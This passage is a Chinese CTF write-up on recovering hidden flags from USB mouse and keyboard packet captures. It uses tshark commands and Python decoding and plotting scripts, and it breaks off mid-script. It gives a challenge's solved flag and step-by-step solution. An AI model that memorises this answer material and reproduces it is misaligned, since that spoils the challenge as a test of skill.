    <content type="html"><![CDATA[<p>@<a href="%E7%9B%AE%E5%BD%95%E6%A0%87%E9%A2%98">TOC</a></p><h2 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节</p><p>第一个字节,代表按键</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">当取0×00时,代表没有按键<br>当取0×01时,代表按左键<br>当取0×02时,代表当前按键为右键<br></code></pre></td></tr></table></figure><p>第二个字节,可看作为signed byte类型，其最高位为符号位，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">当值为正时，代表鼠标右移像素位；<br>值为负时，代表鼠标左移像素位。<br></code></pre></td></tr></table></figure><p>第三个字节,代表垂直上下移动的偏移。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">当值为正时，代表鼠标上移像素位；<br>值为负时，代表鼠标下移像素位。<br></code></pre></td></tr></table></figure><h3 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h3><p>flag隐藏在usb流量中，通过USB协议数据中的鼠标移动轨迹转换成flag</p><p><strong>题目</strong><br>方法1：<br>基于python2的UsbMiceHacker.py脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding:utf-8</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br>mousePositionX = <span class="hljs-number">0</span><br>mousePositionY = <span class="hljs-number">0</span><br><br>X = []<br>Y = []<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br>data = []<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> mousePositionX<br>    <span class="hljs-keyword">global</span> mousePositionY<br>    <span class="hljs-comment"># check argv</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        python UsbMiceHacker.py data.pcap [LEFT|RIGHT|MOVE|ALL]&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Tips : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        To use this python script , you must install the numpy,matplotlib first.&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        You can use `sudo pip install matplotlib numpy` to install it&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Author : &quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        WangYihang &lt;wangyihanger@gmail.com&gt;&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        If you have any questions , please contact me by email.&quot;</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;        Thank you for using.&quot;</span><br>        exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># get argv</span><br>    pcapFilePath = sys.argv[<span class="hljs-number">1</span>]<br>    action = sys.argv[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-keyword">if</span> action != <span class="hljs-string">&quot;LEFT&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;ALL&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;RIGHT&quot;</span> <span class="hljs-keyword">and</span> action != <span class="hljs-string">&quot;MOVE&quot;</span>:<br>        action = <span class="hljs-string">&quot;LEFT&quot;</span><br><br>    <span class="hljs-comment"># get data of pcap</span><br>    command = <span class="hljs-string">&quot;tshark -r &#x27;%s&#x27; -T fields -e usb.capdata &gt; %s&quot;</span> % (<br>        pcapFilePath, DataFileName)<br>    <span class="hljs-built_in">print</span> command<br>    os.system(command)<br><br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(DataFileName, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            data.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br><br>    <span class="hljs-comment"># handle move</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        Bytes = i.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(Bytes) == <span class="hljs-number">8</span>:<br>            horizontal = <span class="hljs-number">2</span>  <span class="hljs-comment"># -</span><br>            vertical = <span class="hljs-number">4</span>  <span class="hljs-comment"># |</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(Bytes) == <span class="hljs-number">4</span>:<br>            horizontal = <span class="hljs-number">1</span>  <span class="hljs-comment"># -</span><br>            vertical = <span class="hljs-number">2</span>  <span class="hljs-comment"># |</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br>        offsetX = <span class="hljs-built_in">int</span>(Bytes[horizontal], <span class="hljs-number">16</span>)<br>        offsetY = <span class="hljs-built_in">int</span>(Bytes[vertical], <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> offsetX &gt; <span class="hljs-number">127</span>:<br>            offsetX -= <span class="hljs-number">256</span><br>        <span class="hljs-keyword">if</span> offsetY &gt; <span class="hljs-number">127</span>:<br>            offsetY -= <span class="hljs-number">256</span><br>        mousePositionX += offsetX<br>        mousePositionY += offsetY<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;01&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Left butten.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;LEFT&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">elif</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;02&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Right Butten.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;RIGHT&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">elif</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-comment"># print &quot;[+] Move.&quot;</span><br>            <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;MOVE&quot;</span>:<br>                <span class="hljs-comment"># draw point to the image panel</span><br>                X.append(mousePositionX)<br>                Y.append(-mousePositionY)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># print &quot;[-] Known operate.&quot;</span><br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">if</span> action == <span class="hljs-string">&quot;ALL&quot;</span>:<br>            <span class="hljs-comment"># draw point to the image panel</span><br>            X.append(mousePositionX)<br>            Y.append(-mousePositionY)<br><br>    fig = plt.figure()<br>    ax1 = fig.add_subplot(<span class="hljs-number">111</span>)<br><br>    ax1.set_title(<span class="hljs-string">&#x27;[%s]-[%s] Author : WangYihang&#x27;</span> % (pcapFilePath, action))<br>    ax1.scatter(X, Y, c=<span class="hljs-string">&#x27;r&#x27;</span>, marker=<span class="hljs-string">&#x27;o&#x27;</span>)<br>    plt.show()<br><br>    <span class="hljs-comment"># clean temp data</span><br>    os.system(<span class="hljs-string">&quot;rm ./%s&quot;</span> % (DataFileName))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>还有基于python3的<a href="https://github.com/WangYihang/UsbMiceDataHacker">UsbMiceDataHacker.py</a>脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 UsbMiceDataHacker.py usb2.pcap RIGHT<br><span class="hljs-comment">#RIGHT代表右键</span><br></code></pre></td></tr></table></figure><p>我这里什么也没有<br><img src="https://img-blog.csdnimg.cn/20210412170000487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>贴上其他人成功的结果<br><img src="https://img-blog.csdnimg.cn/20210405124259780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方法2：<br>提取鼠标流量数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r usb2.pcap -T fields -e usb.capdata &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt<br><img src="https://img-blog.csdnimg.cn/20210405124552237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>剔除空行，亲身经历，这步很重要，包含空行会得到错误结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r usb2.pcap -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>没有冒号，使用脚本添加冒号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">f=open(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-keyword">fi</span>=open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> 1:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> len(a)==8: <span class="hljs-comment"># 键盘流量len=16，鼠标流量len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,len(a),2):<br>                <span class="hljs-keyword">if</span> i+2 != len(a):<br>                    out+=a[i]+a[i+1]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+1]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p>运行脚本，得到out.txt<br><img src="https://img-blog.csdnimg.cn/20210405125011771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用mouse.py脚本，通过更改btn_flag的值来测试鼠标左右键</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;xy.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>posx = <span class="hljs-number">0</span><br>posy = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) != <span class="hljs-number">12</span> :<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">3</span>:<span class="hljs-number">5</span>],<span class="hljs-number">16</span>)<br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">127</span> :<br>        x -= <span class="hljs-number">256</span><br>    <span class="hljs-keyword">if</span> y &gt; <span class="hljs-number">127</span> :<br>        y -= <span class="hljs-number">256</span><br>    posx += x<br>    posy += y<br>    btn_flag = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>],<span class="hljs-number">16</span>)  <span class="hljs-comment"># 1 for left , 2 for right , 0 for nothing</span><br>    <span class="hljs-keyword">if</span> btn_flag == <span class="hljs-number">2</span> : <span class="hljs-comment"># 1 代表左键</span><br>        f.write(<span class="hljs-built_in">str</span>(posx))<br>        f.write(<span class="hljs-string">&#x27; &#x27;</span>)<br>        f.write(<span class="hljs-built_in">str</span>(posy))<br>        f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>f.close()<br></code></pre></td></tr></table></figure><p>经过测试是鼠标右键流量，在生成的xy.txt中可以得到坐标：<br><img src="https://img-blog.csdnimg.cn/20210412192227460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>看了<a href="https://blog.csdn.net/qq_45555226/article/details/102810474">大师傅的wp</a>，发现我们添加冒号得到的内容不一样</p><p><img src="https://img-blog.csdnimg.cn/20210412162949750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>大师傅直接提取鼠标流量，含有冒号，而我提取出来的不含冒号，是Wireshark版本不同的缘故，在网上找到老版本的Wireshark</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Wireshark-win64-2.4.3<br>https://pan.baidu.com/s/1nvIIKpr<br>密码：5uao<br></code></pre></td></tr></table></figure><p>提取流量得到usbdata.txt,包含冒号：<img src="https://img-blog.csdnimg.cn/20210412163509262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接使用上面的mouse.py脚本，即可得到xy.txt。<br><img src="https://img-blog.csdnimg.cn/20210412164602929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>进入gnuplot工具，把xy.txt文本里的坐标转化为图片<br><img src="https://img-blog.csdnimg.cn/20210412165000484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>翻转一下图片<br><img src="https://img-blog.csdnimg.cn/20210412165426744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">XNCA&#123;U2BPCAPCETEVERYTHING&#125;<br></code></pre></td></tr></table></figure><p>也可以利用python脚本画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>x, y = np.loadtxt(<span class="hljs-string">&#x27;xy.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27; &#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>plt.plot(x, y, <span class="hljs-string">&#x27;.&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/20210412200559583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3><p>USB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。</p><p>击键信息集中在第3个字节，每次击键都会产生一个数据包。</p><p><a href="https://max.book118.com/html/2017/0407/99227972.shtm">参考文档</a>：USB keyboard映射表<br><img src="https://img-blog.csdnimg.cn/20210405115902138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="实战练习-1"><a href="#实战练习-1" class="headerlink" title="实战练习"></a>实战练习</h3><p>flag信息一般隐藏在USB流量中，通过USB协议数据中的键盘键码转换成键位。</p><p><strong>题目1：</strong><br>分析流量包，发现数据是16位，所以是USB键盘流量<br><img src="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>tshark提取USB流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt <br></code></pre></td></tr></table></figure><p>usbdata.txt文件内容<br><img src="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现提取出来包含空行，使用命令剔除空行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>查看usbdata.txt空余行消失<br><img src="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取出来的数据可能会带冒号，也可能不带，但是一般的脚本都会按照有冒号的数据来识别。有冒号时提取数据的<code>[6:8]</code>，无冒号时数据在<code>[4:6]</code></p><p>可以利用脚本加上冒号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># 键盘流量len=16，鼠标流量len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在网上找到两个键盘流量脚本</p><p>keyboard1.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">mappings = &#123; <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span 